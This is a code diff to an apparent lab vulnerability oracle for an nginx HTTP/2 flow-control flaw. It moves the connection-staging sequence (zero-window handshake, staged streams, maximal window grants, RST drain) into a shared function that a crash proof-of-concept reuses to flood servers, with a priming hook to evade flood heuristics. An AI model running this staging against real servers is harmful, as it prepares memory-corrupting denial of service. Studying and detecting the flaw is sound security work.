@@ -57,6 +57,10 @@ NOT-H2}; any UNCLEAR or ERROR target makes it 1. Each target is probed
 in isolation (R3-target-isolation): one bad target cannot abort the
 others.
 
+The staging ritual itself (steps 1-6) is factored out as
+staging_ritual() and reused by poc/crash.py: the crash PoC floods from
+exactly the connection state this oracle validated.
+
 This oracle never drives the out-of-bounds copy: no memory is
 corrupted on either side. Run inside the lab's probe container:
 
@@ -75,6 +79,7 @@ from h2lib import (
     DATA,
     GOAWAY,
     H2Client,
+    H2_DEFAULT_CONN_WINDOW,
     H2_MAX_WINDOW,
     PING,
     FLAG_ACK,
@@ -185,28 +190,89 @@ def death_result(verdict: str, phase: str, ev: list[str], how: str) -> dict:
     return {"verdict": verdict, "phase": phase, "evidence": ev + [f"{how} during {phase} phase{hint}"]}
 
 
-def probe_target(host: str, port: int, streams: int = N_STREAMS) -> dict:
-    ev: list[str] = []
+# --- reusable staging ritual (shared with crash.py) ------------------------
+#
+# The validated sequence: zero-window handshake, staged GET /big.bin
+# streams, connection window to NGX_HTTP_V2_MAX_WINDOW, per-stream
+# grants, the first-return stream-0 WINDOW_UPDATE with its bounded
+# drain, then RST_STREAM of every stream and the post-RST drain.
+# probe_target() runs this and then probes; crash.py runs this and then
+# floods.  The connection's fate is reported as (outcome, phase, detail)
+# so each caller can attach its own verdict semantics (the oracle's
+# PATCHED at first-return is the crash PoC's SURVIVED).
+
+RITUAL_ALIVE = "alive"                # survived the rst-drain; on the
+                                      # vulnerable build send_window is
+                                      # now past NGX_HTTP_V2_MAX_WINDOW
+RITUAL_NOT_H2 = "not-h2"              # peer never sent SETTINGS (no h2)
+RITUAL_FCE = "flow-control-error"     # GOAWAY FLOW_CONTROL_ERROR (the
+                                      # patched capacity check)
+RITUAL_EOF = "clean-eof"              # clean peer EOF (FIN)
+RITUAL_RESET = "reset"                # peer RST
+RITUAL_RST_SEND_FAIL = "rst-send-fail"  # OSError while sending RST_STREAMs
+RITUAL_TIMEOUT = "timeout"            # socket timeout mid-ritual
+RITUAL_CONN_RESET = "conn-reset"      # ConnectionReset/BrokenPipe mid-ritual
+RITUAL_ERROR = "error"                # other per-target error
+
+
+def staging_ritual(c: H2Client, streams: int = N_STREAMS,
+                   authority: str = "", ev: list[str] | None = None,
+                   first_sid: int = 1, prime=None
+                   ) -> tuple[str, str, Exception | None]:
+    """Run the validated staging ritual on an open H2Client (steps 1-6).
+
+    Appends the ritual's evidence lines to `ev` (created when None).
+    Returns (outcome, phase, detail) — one of the RITUAL_* constants, the
+    phase label where the connection's fate was decided, and the
+    exception for the failure outcomes (else None).  Never raises.
+
+    Streams are opened at first_sid, first_sid+2, ... (default 1) so a
+    caller that already consumed stream ids on this connection (crash.py
+    primes the flood-heuristic allowance with real downloads first) can
+    continue the numbering without collisions.
+
+    `prime`, when given, is invoked right after the NOT-H2 check as
+    prime(c, first_sid, ev) and must return (next free odd stream id,
+    the connection's current send window); the ritual then grants the
+    connection window up to NGX_HTTP_V2_MAX_WINDOW from THAT value
+    (a fresh connection reports 65535 — the default arithmetic) and
+    stages from the returned stream id.  probe_target never passes one.
+
+    RITUAL_ALIVE comes back only when the connection survived the whole
+    ritual: on the vulnerable build h2c->send_window is then past
+    NGX_HTTP_V2_MAX_WINDOW (the double credit landed) and the caller may
+    probe or flood; every other outcome describes a connection that
+    ended (or failed) at the labeled phase.
+    """
+    if ev is None:
+        ev = []
     phase = PHASE_STAGING
-    c: H2Client | None = None
+    conn_window = H2_DEFAULT_CONN_WINDOW
     try:
-        c = H2Client(host, port)  # inside the try: connect errors are per-target
         hs = c.handshake(initial_window=0)
         if not server_settings_seen(hs):
-            head = c.buf[:64] if c.buf else b"<no bytes>"
-            return {"verdict": "NOT-H2", "phase": phase,
-                    "evidence": [f"no server SETTINGS; first bytes: {head!r}"]}
+            head = bytes(c.buf[:64]) if c.buf else b"<no bytes>"
+            ev.append(f"no server SETTINGS; first bytes: {head!r}")
+            return RITUAL_NOT_H2, phase, None
         ev.append("handshake ok (initial window 0)")
 
-        sids = [1 + 2 * i for i in range(streams)]
+        if prime is not None:
+            first_sid, conn_window = prime(c, first_sid, ev)
+
+        sids = [first_sid + 2 * i for i in range(streams)]
         for sid in sids:
-            c.open_stream(sid, "/big.bin", f"{host}:{port}")
+            c.open_stream(sid, "/big.bin", authority)
         ev.append(f"opened {streams} streams (GET /big.bin)")
 
         # connection window -> NGX_HTTP_V2_MAX_WINDOW, then stage + queue the
         # DATA; do NOT read: kernel backpressure must keep frames in nginx's
-        # outbound queue until the RST cleanup runs.
-        c.window_update(0, H2_MAX_WINDOW - 65535)
+        # outbound queue until the RST cleanup runs.  The grant is relative
+        # to the connection's current window (65535 on a fresh connection;
+        # whatever priming left behind otherwise) so the capacity check
+        # `send_window + window > MAX` still accepts it.
+        grant = H2_MAX_WINDOW - max(min(conn_window, H2_MAX_WINDOW), 0)
+        if grant > 0:
+            c.window_update(0, grant)
         for sid in sids:
             c.window_update(sid, GRANT_PER_STREAM)
         time.sleep(0.6)
@@ -234,7 +300,7 @@ def probe_target(host: str, port: int, streams: int = N_STREAMS) -> dict:
                 f"FLOW_CONTROL_ERROR (last_sid={goaway.get('last_sid')}) — the "
                 "patched capacity check rejected the credit"
             )
-            return {"verdict": "PATCHED", "phase": phase, "evidence": ev}
+            return RITUAL_FCE, phase, None
         if c.eof:
             ev.append(
                 f"first return {FIRST_RETURN >> 20} MiB on stream 0: clean peer "
@@ -243,11 +309,9 @@ def probe_target(host: str, port: int, streams: int = N_STREAMS) -> dict:
                 "WINDOW_UPDATE (GOAWAY lost behind the clogged userspace queue; "
                 "the patched capacity check counts queued-but-unsent DATA)"
             )
-            return {"verdict": "PATCHED", "phase": phase, "evidence": ev}
+            return RITUAL_EOF, phase, None
         if c.reset:
-            return death_result("UNCLEAR", phase, ev,
-                                "connection reset (RST) surfaced during the "
-                                "bounded first-return drain")
+            return RITUAL_RESET, phase, None
         ev.append(
             f"first return {FIRST_RETURN >> 20} MiB on stream 0 accepted — no "
             f"FIN within the {FIRST_RETURN_DRAIN_CAP >> 10} KiB bounded drain "
@@ -257,15 +321,11 @@ def probe_target(host: str, port: int, streams: int = N_STREAMS) -> dict:
 
         # --- RST drain: the double-credit window ----------------------------
         phase = PHASE_RST_DRAIN
-        # The connection was proven alive at the end of the first-return
-        # check, so a send failure here is a mid-probe death — attributed to
-        # this phase, never to the first-return WINDOW_UPDATE.
         try:
             for sid in sids:
                 c.rst(sid)
         except OSError as exc:
-            return death_result("UNCLEAR", phase, ev,
-                                f"send failed while sending RST_STREAMs ({exc!r})")
+            return RITUAL_RST_SEND_FAIL, phase, exc
         ev.append(f"RST all {streams} streams")
 
         # A connection that survives to here was alive past the first-return
@@ -287,16 +347,59 @@ def probe_target(host: str, port: int, streams: int = N_STREAMS) -> dict:
             if err == ERR_FLOW_CONTROL_ERROR:
                 # GOAWAY FLOW_CONTROL_ERROR is definitive PATCHED evidence in
                 # any phase: only the capacity check emits it.
-                return {"verdict": "PATCHED", "phase": phase, "evidence": ev}
+                return RITUAL_FCE, phase, None
         if c.reset:
-            return death_result("UNCLEAR", phase, ev,
-                                "connection reset by peer (RST) observed at drain")
+            return RITUAL_RESET, phase, None
         if c.eof:
+            return RITUAL_EOF, phase, None
+        return RITUAL_ALIVE, phase, None
+    except (socket.timeout, TimeoutError):
+        return RITUAL_TIMEOUT, phase, None
+    except (ConnectionResetError, BrokenPipeError) as exc:
+        return RITUAL_CONN_RESET, phase, exc
+    except (OSError, ValueError) as exc:
+        return RITUAL_ERROR, phase, exc
+
+
+def probe_target(host: str, port: int, streams: int = N_STREAMS) -> dict:
+    ev: list[str] = []
+    phase = PHASE_STAGING
+    c: H2Client | None = None
+    try:
+        c = H2Client(host, port)  # inside the try: connect errors are per-target
+        outcome, phase, detail = staging_ritual(
+            c, streams=streams, authority=f"{host}:{port}", ev=ev)
+        if outcome == RITUAL_NOT_H2:
+            return {"verdict": "NOT-H2", "phase": phase, "evidence": ev}
+        if outcome == RITUAL_FCE:
+            # GOAWAY FLOW_CONTROL_ERROR is definitive PATCHED evidence in any
+            # phase: only the capacity check emits it.
+            return {"verdict": "PATCHED", "phase": phase, "evidence": ev}
+        if outcome == RITUAL_EOF:
+            if phase == PHASE_FIRST_RETURN:
+                return {"verdict": "PATCHED", "phase": phase, "evidence": ev}
             # R3-reset-mislabel: a clean EOF here used to be reported as
             # PATCHED. Without a GOAWAY we cannot attribute the close to the
             # first-return check, so this must stay UNCLEAR.
             return death_result("UNCLEAR", phase, ev,
                                 "clean EOF from peer (no GOAWAY) observed at drain")
+        if outcome == RITUAL_RESET:
+            if phase == PHASE_FIRST_RETURN:
+                return death_result("UNCLEAR", phase, ev,
+                                    "connection reset (RST) surfaced during the "
+                                    "bounded first-return drain")
+            return death_result("UNCLEAR", phase, ev,
+                                "connection reset by peer (RST) observed at drain")
+        if outcome == RITUAL_RST_SEND_FAIL:
+            return death_result("UNCLEAR", phase, ev,
+                                f"send failed while sending RST_STREAMs ({detail!r})")
+        if outcome == RITUAL_TIMEOUT:
+            return death_result("UNCLEAR", phase, ev, "timeout")
+        if outcome == RITUAL_CONN_RESET:
+            return death_result("UNCLEAR", phase, ev, "connection reset by peer")
+        if outcome == RITUAL_ERROR:
+            return {"verdict": "ERROR", "phase": phase,
+                    "error": f"{type(detail).__name__}: {detail}", "evidence": ev}
 
         # --- the probe: an oversized stream-0 WINDOW_UPDATE + a tagged PING --
         phase = PHASE_PROBE
